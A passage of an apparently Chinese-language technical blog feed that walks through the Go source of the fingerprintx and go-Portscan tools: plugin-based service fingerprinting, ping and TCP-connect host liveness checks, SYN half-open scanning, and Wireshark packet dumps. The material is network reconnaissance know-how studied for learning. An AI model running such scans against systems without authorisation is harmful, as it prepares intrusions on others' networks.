class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(e Service)</span></span> Metadata() Metadata &#123;<br><span class="hljs-keyword">switch</span> e.Protocol &#123;<br><span class="hljs-keyword">case</span> ProtoFTP:<br><span class="hljs-keyword">var</span> p ServiceFTP<br>_ = json.Unmarshal(e.Raw, &amp;p)<br><span class="hljs-keyword">return</span> p<br><span class="hljs-keyword">case</span> ProtoPostgreSQL:<br><span class="hljs-keyword">var</span> p ServicePostgreSQL<br>_ = json.Unmarshal(e.Raw, &amp;p)<br><span class="hljs-keyword">return</span> p<br><span class="hljs-comment">// ......</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">var</span> p ServiceUnknown<br>_ = json.Unmarshal(e.Raw, &amp;p)<br><span class="hljs-keyword">return</span> p<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后再看看它具体的识别逻辑 simple_scan.go ，写的很清晰：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">// 插件初始化</span><br>setupPlugins()<br>    <span class="hljs-comment">// TLS 的一些东西</span><br>cipherSuites := <span class="hljs-built_in">make</span>([]<span class="hljs-type">uint16</span>, <span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> _, suite := <span class="hljs-keyword">range</span> tls.CipherSuites() &#123;<br>cipherSuites = <span class="hljs-built_in">append</span>(cipherSuites, suite.ID)<br>&#125;<br><span class="hljs-keyword">for</span> _, suite := <span class="hljs-keyword">range</span> tls.InsecureCipherSuites() &#123;<br>cipherSuites = <span class="hljs-built_in">append</span>(cipherSuites, suite.ID)<br>&#125;<br>tlsConfig.InsecureSkipVerify = <span class="hljs-literal">true</span> <span class="hljs-comment">//nolint:gosec</span><br>tlsConfig.CipherSuites = cipherSuites<br>tlsConfig.MinVersion = tls.VersionTLS10<br>&#125;<br></code></pre></td></tr></table></figure><p>setupPlugins 这就是把 plugin_list.go 中 import 导入注册的插件进行分类、排序：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">setupPlugins</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sortedTCPPlugins) &gt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">// 对插件进行分类 TCP、TCPLSP、UDP</span><br>sortedTCPPlugins = <span class="hljs-built_in">append</span>(sortedTCPPlugins, plugins.Plugins[plugins.TCP]...)<br>sortedTCPTLSPlugins = <span class="hljs-built_in">append</span>(sortedTCPTLSPlugins, plugins.Plugins[plugins.TCPTLS]...)<br>sortedUDPPlugins = <span class="hljs-built_in">append</span>(sortedUDPPlugins, plugins.Plugins[plugins.UDP]...)<br><span class="hljs-comment">// 将插件按照优先级进行排序</span><br>sort.Slice(sortedTCPPlugins, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i, j <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> sortedTCPPlugins[i].Priority() &lt; sortedTCPPlugins[j].Priority()<br>&#125;)<br>sort.Slice(sortedUDPPlugins, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i, j <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> sortedUDPPlugins[i].Priority() &lt; sortedUDPPlugins[j].Priority()<br>&#125;)<br>sort.Slice(sortedTCPTLSPlugins, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i, j <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> sortedTCPTLSPlugins[i].Priority() &lt; sortedTCPTLSPlugins[j].Priority()<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是识别的具体流程，很清晰，先遍历一圈，识别默认服务，然后再按照优先级进行指纹识别：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Config)</span></span> SimpleScanTarget(target plugins.Target) (*plugins.Service, <span class="hljs-type">error</span>) &#123;<br>ip := target.Address.Addr().String()<br>port := target.Address.Port()<br><span class="hljs-keyword">for</span> _, plugin := <span class="hljs-keyword">range</span> sortedTCPPlugins &#123;<br>        <span class="hljs-comment">// 查看该端口对应的服务是否存在 存在的化就扫描这个服务 ( 端口优先权 )</span><br><span class="hljs-keyword">if</span> plugin.PortPriority(port) &#123;<br>            <span class="hljs-comment">// TCP 连接</span><br>conn, err := DialTCP(ip, port)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;unable to connect, err = %w&quot;</span>, err)<br>&#125;<br>            <span class="hljs-comment">// 使用 simplePluginRunner 进行识别</span><br>result, err := simplePluginRunner(conn, target, c, plugin)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &amp;&amp; c.Verbose &#123;<br>log.Printf(<span class="hljs-string">&quot;error: %v scanning %v\n&quot;</span>, err, target.Address.String())<br>&#125;<br><span class="hljs-keyword">if</span> result != <span class="hljs-literal">nil</span> &amp;&amp; err == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> result, <span class="hljs-literal">nil</span><br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-comment">// TCP TLS 类型的....</span><br><span class="hljs-comment">// 快速模式 也就是只检查默认端口</span><br><span class="hljs-keyword">if</span> c.FastMode &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">if</span> isTLS &#123;<br><span class="hljs-comment">// ...</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 按照优先级遍历所有插件进行指纹识别 这里感觉可以去掉上面的默认服务的识别 可以简单增加一个判断</span><br><span class="hljs-keyword">for</span> _, plugin := <span class="hljs-keyword">range</span> sortedTCPPlugins &#123;<br>conn, err := DialTCP(ip, port)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;unable to connect, err = %w&quot;</span>, err)<br>&#125;<br>result, err := simplePluginRunner(conn, target, c, plugin)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &amp;&amp; c.Verbose &#123;<br>log.Printf(<span class="hljs-string">&quot;error: %v scanning %v\n&quot;</span>, err, target.Address.String())<br>&#125;<br><span class="hljs-keyword">if</span> result != <span class="hljs-literal">nil</span> &amp;&amp; err == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// identified plugin match</span><br><span class="hljs-keyword">return</span> result, <span class="hljs-literal">nil</span><br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里是遍历了 2 次，第一次是获取默认服务，第二次是去按照优先级全部扫一遍。这里感觉有些麻烦，可以向 go-Portscan 那样维护一个端口和默认服务的 map，这里就维护一个端口和插件的 map ，就不需要一直遍历获取默认服务插件了。</p><p>之后就是 simplePluginRunner 了，它其实就是调用插件的 Run 方法去识别：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">simplePluginRunner</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">conn net.Conn,</span></span><br><span class="hljs-params"><span class="hljs-function">target plugins.Target,</span></span><br><span class="hljs-params"><span class="hljs-function">config *Config,</span></span><br><span class="hljs-params"><span class="hljs-function">plugin plugins.Plugin,</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span> (*plugins.Service, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">if</span> config.Verbose &#123;<br>log.Printf(<span class="hljs-string">&quot;%v %v-&gt; scanning %v\n&quot;</span>,<br>target.Address.String(),<br>target.Host,<br>plugins.CreatePluginID(plugin),<br>)<br>&#125;<br>result, err := plugin.Run(conn, config.DefaultTimeout, target)<br><span class="hljs-keyword">if</span> config.Verbose &#123;<br>log.Printf(<br><span class="hljs-string">&quot;%v %v-&gt; completed %v\n&quot;</span>,<br>target.Address.String(),<br>target.Host,<br>plugins.CreatePluginID(plugin),<br>)<br>&#125;<br><span class="hljs-keyword">return</span> result, err<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><ul><li>fingerprintx 接口 插件，然后通过 import 导包去实现插件注册挺不错的</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源码学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go-Portscan 源码学习</title>
      <link href="/2024/02/20/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/go-Portscan/"/>
      <url>/2024/02/20/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/go-Portscan/</url>
      
        <content type="html"><![CDATA[<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>项目地址：<a href="https://github.com/XinRoom/go-portScan">https://github.com/XinRoom/go-portScan</a></p><p>一款端口扫描方面很全面的工具：</p><ol><li>主机验活</li><li>端口扫描</li><li>端口指纹识别</li><li>WEB指纹识别</li></ol><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">├─cmd<br>├─core<br>│  ├─host# 主机验活<br>│  └─port<br>│      ├─fingerprint# 指纹识别<br>│      │  └─webfinger# web指纹识别<br>│      ├─syn# syn 端口扫描<br>│      └─tcp# tcp 端口扫描<br>└─util<br>    └─httputil<br></code></pre></td></tr></table></figure><h2 id="主机验活"><a href="#主机验活" class="headerlink" title="主机验活"></a>主机验活</h2><p><code>core/host/ping.go</code></p><p>这里验活用的是 3 种方式：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">IsLive</span><span class="hljs-params">(ip <span class="hljs-type">string</span>, tcpPing <span class="hljs-type">bool</span>, tcpTimeout time.Duration)</span></span> (ok <span class="hljs-type">bool</span>) &#123;<br><span class="hljs-keyword">if</span> CanIcmp &#123;<br>ok = IcmpOK(ip)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>ok = PingOk(ip)<br>&#125;<br><span class="hljs-keyword">if</span> !ok &amp;&amp; tcpPing &#123;<br>ok = TcpPing(ip, TcpPingPorts, tcpTimeout)<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><ol><li>使用 <code>github.com/go-ping/ping</code> 包发送 ICMP 进行主机验活</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">IcmpOK</span><span class="hljs-params">(host <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br>pinger, err := ping.NewPinger(host)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>pinger.SetPrivileged(<span class="hljs-literal">true</span>)<br>pinger.Count = <span class="hljs-number">1</span><br>pinger.Timeout = <span class="hljs-number">800</span> * time.Millisecond<br><span class="hljs-keyword">if</span> pinger.Run() != <span class="hljs-literal">nil</span> &#123; <span class="hljs-comment">// Blocks until finished. return err</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><span class="hljs-keyword">if</span> stats := pinger.Statistics(); stats.PacketsRecv &gt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>执行系统 <code>ping</code> 命令</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">PingOk</span><span class="hljs-params">(host <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">switch</span> runtime.GOOS &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;linux&quot;</span>:<br>cmd := exec.Command(<span class="hljs-string">&quot;ping&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;-W&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, host)<br><span class="hljs-keyword">var</span> out bytes.Buffer<br>cmd.Stdout = &amp;out<br>cmd.Run()<br><span class="hljs-keyword">if</span> strings.Contains(out.String(), <span class="hljs-string">&quot;ttl=&quot;</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;windows&quot;</span>:<br>cmd := exec.Command(<span class="hljs-string">&quot;ping&quot;</span>, <span class="hljs-string">&quot;-n&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;-w&quot;</span>, <span class="hljs-string">&quot;500&quot;</span>, host)<br><span class="hljs-keyword">var</span> out bytes.Buffer<br>cmd.Stdout = &amp;out<br>cmd.Run()<br><span class="hljs-keyword">if</span> strings.Contains(out.String(), <span class="hljs-string">&quot;TTL=&quot;</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;darwin&quot;</span>:<br>cmd := exec.Command(<span class="hljs-string">&quot;ping&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;-t&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, host)<br><span class="hljs-keyword">var</span> out bytes.Buffer<br>cmd.Stdout = &amp;out<br>cmd.Run()<br><span class="hljs-keyword">if</span> strings.Contains(out.String(), <span class="hljs-string">&quot;ttl=&quot;</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>对常见的端口进行 TCP 连接</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TcpPing</span><span class="hljs-params">(host <span class="hljs-type">string</span>, ports []<span class="hljs-type">uint16</span>, timeout time.Duration)</span></span> (ok <span class="hljs-type">bool</span>) &#123;<br><span class="hljs-keyword">var</span> wg sync.WaitGroup<br>ctx, cancel := context.WithCancel(context.Background())<br>d := net.Dialer&#123;<br>Timeout:   timeout + time.Second,<br>KeepAlive: <span class="hljs-number">0</span>,<br>&#125;<br><span class="hljs-keyword">for</span> _, port := <span class="hljs-keyword">range</span> ports &#123;<br>time.Sleep(<span class="hljs-number">10</span> * time.Millisecond)<br>wg.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(_port <span class="hljs-type">uint16</span>)</span></span> &#123;<br>conn, err := d.DialContext(ctx, <span class="hljs-string">&quot;tcp&quot;</span>, fmt.Sprintf(<span class="hljs-string">&quot;%s:%d&quot;</span>, host, _port))<br><span class="hljs-keyword">if</span> conn != <span class="hljs-literal">nil</span> &#123;<br>conn.Close()<br>ok = <span class="hljs-literal">true</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &amp;&amp; strings.Contains(err.Error(), <span class="hljs-string">&quot;refused it&quot;</span>) &#123; <span class="hljs-comment">// 表明对端发送了RST包</span><br>ok = <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> ok &#123;<br>cancel()<br>&#125;<br>wg.Done()<br>&#125;(port)<br>&#125;<br>wg.Wait()<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里即使用了 ping 包又使用了 ping 命令可能是 ping 包有一定的使用限制：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240302132355749.png?imageSlim" alt="image-20240302132355749"></p><p>Linux 要启用 <code>sudo sysctl -w net.ipv4.ping_group_range=&quot;0 2147483647&quot;</code> 的，不是都直接可以通用了的，所以又添加了一个执行 ping 命令的函数。</p><p>然后还有一个 TCP 连接常见端口的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> TcpPingPorts = []<span class="hljs-type">uint16</span>&#123;<span class="hljs-number">80</span>, <span class="hljs-number">22</span>, <span class="hljs-number">445</span>, <span class="hljs-number">23</span>, <span class="hljs-number">443</span>, <span class="hljs-number">81</span>, <span class="hljs-number">161</span>, <span class="hljs-number">3389</span>, <span class="hljs-number">8080</span>, <span class="hljs-number">8081</span>&#125;<br></code></pre></td></tr></table></figure><p>这里是因为防火墙可以设置为禁 ping 默认的，所以这里就使用 TCP 连接下常见端口进行验活。</p><p>不过这种方式也是不能够完全 OK 的，所以感觉可以简化一下，或者直接对我们获取的 IP 进行全端口扫描就行了。</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="SYN"><a href="#SYN" class="headerlink" title="SYN"></a>SYN</h4><p>端口扫描这里是有 2 种方式一种 SYN 还有就是 TCP ，TCP 就是使用 <code>net.DialTimeout</code> 去连接，这里就不细看了，主要是 SYN 。</p><p>TCP SYN 端口扫描就是所谓的半连接，TCP 连接需要进行 3 次握手，四次挥手。</p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/202309141358211.png?imageSlim" style="zoom:67%;" /><p>这里的 SYN 扫描就是客户端发送一个 SYN ，然后只要服务端响应了 SYN+ACK 就证明其端口开放，只后就响应一个 RST 表示关闭连接。也就是这样：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/934e80357b05c1a0397471c171285f5b08a9a3.png?imageSlim"></p><p>使用 tcp 连接去判断端口开放就需要等待，而 syn 扫描的宗旨就是不去等待，也就是所谓了”无状态”，发送 syn 包的线程就一直发送，另起一个线程去监听响应。以此来达到快速端口扫描的目的，而到底多块其实就取决于 syn 发包的速度了，这里简单记录下 masscan 为什么能号称 “6分钟扫描全网” ，使用 syn 只是一点，更重要的其实就是 <a href="http://www.ntop.org/products/pf_ring/">PF_RING</a> 驱动了，它发包速率快（ 1000万&#x2F;秒 ），自然扫的快了。而 pcap 最高才 150万&#x2F;秒。</p><p>因为 SYN 半连接扫描的特性，端口扫描的速度也就只是受发包速率的影响了，可以看下 gomasscan 的介绍，了解下发包速率的差距。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240302135949777.png?imageSlim" alt="image-20240302135949777"></p><h4 id="协议介绍"><a href="#协议介绍" class="headerlink" title="协议介绍"></a>协议介绍</h4><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">ip.addr</span> == <span class="hljs-number">47.94</span>.<span class="hljs-number">225.171</span> &amp;&amp; tcp<br></code></pre></td></tr></table></figure><p>再看一下具体的 SYN 包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">网络接口层 Ethernet II 数据帧</span><br>Ethernet II, Src: f0:a6:54:9e:08:07 (f0:a6:54:9e:08:07), Dst: HuaweiTe_2b:54:37 (10:c1:72:2b:54:37)<br>    Destination: HuaweiTe_2b:54:37 (10:c1:72:2b:54:37)# 目标 MAC<br>    Source: f0:a6:54:9e:08:07 (f0:a6:54:9e:08:07)# 源 MAC<br>    Type: IPv4 (0x0800)<br><span class="hljs-meta prompt_"># </span><span class="language-bash">网络层 IPV4</span> <br>Internet Protocol Version 4, Src: 192.168.100.21, Dst: 47.94.225.171<br>    0100 .... = Version: 4<br>    .... 0101 = Header Length: 20 bytes (5)<br>    Differentiated Services Field: 0x00 (DSCP: CS0, ECN: Not-ECT)<br>    Total Length: 52<br>    Identification: 0x0cd3 (3283)<br>    Flags: 0x40, Don&#x27;t fragment<br>    Fragment Offset: 0<br>    Time to Live: 64<br>    Protocol: TCP (6)<br>    Header Checksum: 0xf829 [validation disabled]<br>    [Header checksum status: Unverified]<br>    Source Address: 192.168.100.21# 源 IP <br>    Destination Address: 47.94.225.171# 目标 IP<br><span class="hljs-meta prompt_"># </span><span class="language-bash">传输层 TCP</span><br>Transmission Control Protocol, Src Port: 9451, Dst Port: 443, Seq: 0, Len: 0<br>    Source Port: 9451# 源端口<br>    Destination Port: 443# 目的端口<br>    [Stream index: 758]<br>    [TCP Segment Len: 0]<br>    Sequence Number: 0    (relative sequence number)<br>    Sequence Number (raw): 3976647631# seq<br>    [Next Sequence Number: 1    (relative sequence number)]<br>    Acknowledgment Number: 0<br>    Acknowledgment number (raw): 0<br>    1000 .... = Header Length: 32 bytes (8)<br>    Flags: 0x002 (SYN)# 标志位 =&gt; SYN<br>        000. .... .... = Reserved: Not set<br>        ...0 .... .... = Nonce: Not set<br>        .... 0... .... = Congestion Window Reduced (CWR): Not set<br>        .... .0.. .... = ECN-Echo: Not set<br>        .... ..0. .... = Urgent: Not set<br>        .... ...0 .... = Acknowledgment: Not set<br>        .... .... 0... = Push: Not set<br>        .... .... .0.. = Reset: Not set<br>        .... .... ..1. = Syn: Set<br>        .... .... ...0 = Fin: Not set<br>        [TCP Flags: ··········S·]<br>    Window: 64240<br>    [Calculated window size: 64240]<br>    Checksum: 0x56db [unverified]<br>    [Checksum Status: Unverified]<br>    Urgent Pointer: 0<br>    Options: (12 bytes), Maximum segment size, No-Operation (NOP), Window scale, No-Operation (NOP), No-Operation (NOP), SACK permitted<br>    [Timestamps]<br></code></pre></td></tr></table></figure><p>响应的 SYN + ACK：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell">Transmission Control Protocol, Src Port: 443, Dst Port: 9451, Seq: 0, Ack: 1, Len: 0<br>    Source Port: 443<br>    Destination Port: 9451<br>    [Stream index: 758]<br>    [TCP Segment Len: 0]<br>    Sequence Number: 0    (relative sequence number)<br>    Sequence Number (raw): 2705511265# 服务端的 SEQ<br>    [Next 